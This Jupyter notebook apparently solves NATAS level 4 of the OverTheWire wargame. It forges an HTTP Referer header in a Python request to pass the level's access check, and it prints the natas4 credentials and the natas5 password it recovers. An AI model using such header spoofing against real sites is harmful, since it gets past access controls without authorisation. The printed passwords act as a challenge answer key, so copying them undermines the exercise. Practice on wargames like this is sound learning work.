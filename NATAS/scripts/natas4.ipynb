{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from requests.auth import HTTPBasicAuth"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "the website says that we can only have priveleged access if we are coming from the website for natas5. We use a referer to make it look like that is whats going on"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "request_content = requests.get(url='http://natas4.natas.labs.overthewire.org/index.php', headers={'referer':'http://natas5.natas.labs.overthewire.org/'}, auth=HTTPBasicAuth('natas4', 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'<html>\\n<head>\\n<!-- This stuff in the header has nothing to do with the level -->\\n<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\\n<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\\n<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\\n<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\\n<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\\n<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\\n<script>var wechallinfo = { \"level\": \"natas4\", \"pass\": \"tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm\" };</script></head>\\n<body>\\n<h1>natas4</h1>\\n<div id=\"content\">\\n\\nAccess granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD\\n<br/>\\n<div id=\"viewsource\"><a href=\"index.php\">Refresh page</a></div>\\n</div>\\n</body>\\n</html>\\n'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "request_content.content"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "we found the password! Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
